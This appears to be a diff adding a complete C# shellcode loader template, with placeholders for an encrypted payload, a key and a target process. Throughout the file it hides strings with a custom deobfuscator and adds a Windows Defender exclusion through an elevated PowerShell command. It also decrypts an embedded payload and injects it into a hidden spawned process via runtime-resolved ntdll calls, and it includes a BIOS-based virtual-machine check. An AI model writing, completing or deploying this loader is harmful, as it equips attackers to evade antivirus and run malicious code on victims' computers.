@@ -1,0 +1,283 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Management;
+using System.Threading;
+
+class Program
+{
+    private static Random rng = new Random();
+
+    private static void RandomSleep(int minMs = 500, int maxMs = 2000)
+    {
+        int delay = rng.Next(minMs, maxMs);
+        Console.WriteLine($"[*] Sleeping for {delay}ms...");
+        Thread.Sleep(delay);
+    }
+
+    private static string Deobfuscate(int[] indices)
+    {
+        const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- ";
+        char[] chars = new char[indices.Length];
+        for (int i = 0; i < indices.Length; i++)
+        {
+            int index = indices[i] % pool.Length;
+            chars[i] = pool[index];
+        }
+        return new string(chars);
+    }
+
+    static void Main()
+    {
+        try
+        {
+            Console.WriteLine("[*] Starting program...");
+
+            // if (IsVirtualMachine())
+            // {
+            //     Console.WriteLine("[!] VM detected, exiting...");
+            //     return;
+            // }
+
+            byte[] encrypted = %%ENCRYPTED_BYTES%%;
+            byte[] key = %%KEY_BYTES%%;
+            string target = %%TARGET_PROCESS%%;
+
+            Console.WriteLine($"[*] Target process: {target}");
+
+            try
+            {
+                Console.WriteLine("[*] Attempting to add Defender exclusion...");
+                AddDefenderExclusion(target + ".exe");
+                Console.WriteLine("[+] Defender exclusion added.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Skipped Defender exclusion: " + ex.Message);
+            }
+
+            RandomSleep(1000, 3000);
+
+            var proc = StartProcess(target);
+            if (proc == null)
+            {
+                Console.WriteLine("[-] Failed to start target process");
+                return;
+            }
+            Console.WriteLine($"[+] Started process: {proc.Id}");
+
+            RandomSleep(1000, 2500);
+
+            Console.WriteLine("[*] Decrypting payload...");
+            byte[] decrypted = DecryptPayload(encrypted, key);
+            Console.WriteLine("[+] Decryption complete");
+
+            RandomSleep(500, 1500);
+
+            Console.WriteLine("[*] Injecting payload...");
+            InjectViaSyscall(proc.Id, decrypted);
+            Console.WriteLine("[+] Injection successful");
+
+            Array.Clear(decrypted, 0, decrypted.Length);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[!] Exception: {ex.Message}");
+        }
+    }
+
+    static bool IsVirtualMachine()
+    {
+        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            return false;
+
+        string[] vmIndicators = new[]
+        {
+            Deobfuscate(new[] { 21, 12, 48, 26, 43, 30 }),
+            Deobfuscate(new[] { 21, 34, 43, 45, 46, 26, 37 }),
+            Deobfuscate(new[] { 21, 27, 40, 49 }),
+            Deobfuscate(new[] { 23, 30, 39 }),
+            Deobfuscate(new[] { 16, 4, 12, 20 }),
+            Deobfuscate(new[] { 12, 34, 28, 43, 40, 44, 40, 31, 45 }),
+            Deobfuscate(new[] { 7, 50, 41, 30, 43, 63, 21 }),
+            Deobfuscate(new[] { 0, 38, 26, 51, 40, 39 }),
+            Deobfuscate(new[] { 6, 40, 40, 32, 37, 30 })
+        };
+
+        string biosInfo = "";
+        try
+        {
+            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
+            {
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    biosInfo += obj["Manufacturer"]?.ToString() ?? "";
+                    biosInfo += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
+                    biosInfo += obj["Name"]?.ToString() ?? "";
+
+                    Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
+                    Console.WriteLine($"  Name: {obj["Name"]}");
+                    Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("[!] VM check exception: " + ex.Message);
+        }
+
+        biosInfo = biosInfo.ToLower();
+        foreach (string indicator in vmIndicators)
+        {
+            if (biosInfo.Contains(indicator.ToLower()))
+            {
+                Console.WriteLine("[!] Virtual Machine detected based on BIOS info: " + indicator);
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    static void AddDefenderExclusion(string exeName)
+    {
+        string powershell = Deobfuscate(new[] { 41, 40, 48, 30, 43, 44, 33, 30, 37, 37 });
+        string cmd = Deobfuscate(new[] { 0, 29, 29, 63, 12, 41, 15, 43, 30, 31, 30, 43, 30, 39, 28, 30, 64, 63, 4, 49, 28, 37, 46, 44, 34, 40, 39, 15, 43, 40, 28, 30, 44, 44 });
+
+        string command = $"{powershell} -Command \"{cmd} '{exeName}'\"";
+        Console.WriteLine("[*] PowerShell Exclusion Command: " + command);
+
+        var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
+        {
+            CreateNoWindow = true,
+            Verb = "runas",
+            UseShellExecute = true
+        };
+        Process.Start(psi);
+    }
+
+    static Process? StartProcess(string name)
+    {
+        try
+        {
+            Console.WriteLine("[*] Launching process...");
+            return Process.Start(new ProcessStartInfo
+            {
+                FileName = name + ".exe",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("[!] Error launching process: " + ex.Message);
+            return null;
+        }
+    }
+
+    static byte[] DecryptPayload(byte[] encryptedBytes, byte[] key)
+    {
+        using (Aes aes = Aes.Create())
+        {
+            aes.Key = key;
+            aes.Mode = CipherMode.ECB;
+            aes.Padding = PaddingMode.None;
+
+            using (ICryptoTransform decryptor = aes.CreateDecryptor())
+            {
+                byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
+                int paddingSize = decryptedBytes[^1];
+                byte[] rawPayload = new byte[decryptedBytes.Length - paddingSize];
+                Array.Copy(decryptedBytes, rawPayload, rawPayload.Length);
+                return rawPayload;
+            }
+        }
+    }
+
+    static void InjectViaSyscall(int pid, byte[] payload)
+    {
+        Console.WriteLine("[*] Loading ntdll.dll...");
+        IntPtr ntdll = Win32.LoadLibrary("ntdll.dll");
+        if (ntdll == IntPtr.Zero)
+            throw new Exception("Failed to load ntdll.dll");
+
+        string openName = Deobfuscate(new[] { 13, 45, 14, 41, 30, 39, 15, 43, 40, 28, 30, 44, 44 });
+        string allocName = Deobfuscate(new[] { 13, 45, 0, 37, 37, 40, 28, 26, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50 });
+        string writeName = Deobfuscate(new[] { 13, 45, 22, 43, 34, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50 });
+        string threadName = Deobfuscate(new[] { 13, 45, 2, 43, 30, 26, 45, 30, 19, 33, 43, 30, 26, 29, 4, 49 });
+
+        IntPtr openPtr = Win32.GetProcAddress(ntdll, openName);
+        IntPtr allocPtr = Win32.GetProcAddress(ntdll, allocName);
+        IntPtr writePtr = Win32.GetProcAddress(ntdll, writeName);
+        IntPtr threadPtr = Win32.GetProcAddress(ntdll, threadName);
+
+        if (openPtr == IntPtr.Zero || allocPtr == IntPtr.Zero || writePtr == IntPtr.Zero || threadPtr == IntPtr.Zero)
+            throw new Exception("Failed to resolve one or more syscall addresses");
+
+        var open = Marshal.GetDelegateForFunctionPointer<Win32.NtOpenProcessDelegate>(openPtr);
+        var alloc = Marshal.GetDelegateForFunctionPointer<Win32.NtAllocateVirtualMemoryDelegate>(allocPtr);
+        var write = Marshal.GetDelegateForFunctionPointer<Win32.NtWriteVirtualMemoryDelegate>(writePtr);
+        var thread = Marshal.GetDelegateForFunctionPointer<Win32.NtCreateThreadExDelegate>(threadPtr);
+
+        var cid = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)pid };
+        var attr = new Win32.OBJECT_ATTRIBUTES();
+        IntPtr hProc;
+
+        Win32.NTSTATUS st = open(out hProc, 0x1F0FFF, ref attr, ref cid);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtOpenProcessx failed");
+
+        IntPtr addr = IntPtr.Zero;
+        IntPtr len = (IntPtr)payload.Length;
+        st = alloc(hProc, ref addr, IntPtr.Zero, ref len, 0x3000, 0x40);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtAllocateVirtualMemoryx failed");
+
+        st = write(hProc, addr, payload, payload.Length, out _);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtWriteVirtualMemoryx failed");
+
+        st = thread(out var hThread, 0x1FFFFF, IntPtr.Zero, hProc, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtCreateThreadExx failed");
+
+        Console.WriteLine("[+] Shellcode thread started.");
+
+        Win32.NtClose(hProc);
+        Win32.NtClose(hThread);
+    }
+
+    static class Win32
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct OBJECT_ATTRIBUTES
+        {
+            public int Length;
+            public IntPtr RootDirectory, ObjectName;
+            public uint Attributes;
+            public IntPtr SecurityDescriptor, SecurityQualityOfService;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
+        {
+            public IntPtr UniqueProcess;
+            public IntPtr UniqueThread;
+        }
+
+        public enum NTSTATUS : uint { Success = 0 }
+
+        [DllImport("ntdll.dll")] public static extern IntPtr NtClose(IntPtr hObject);
+
+        public delegate NTSTATUS NtOpenProcessDelegate(out IntPtr h, uint a, ref OBJECT_ATTRIBUTES o, ref CLIENT_ID c);
+        public delegate NTSTATUS NtAllocateVirtualMemoryDelegate(IntPtr h, ref IntPtr a, IntPtr z, ref IntPtr r, uint t, uint p);
+        public delegate NTSTATUS NtWriteVirtualMemoryDelegate(IntPtr h, IntPtr a, byte[] b, int l, out int w);
+        public delegate NTSTATUS NtCreateThreadExDelegate(out IntPtr t, uint a, IntPtr o, IntPtr h, IntPtr s, IntPtr p, bool cs, uint z, uint c, uint r, IntPtr b);
+
+        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string n);
+    }
+}
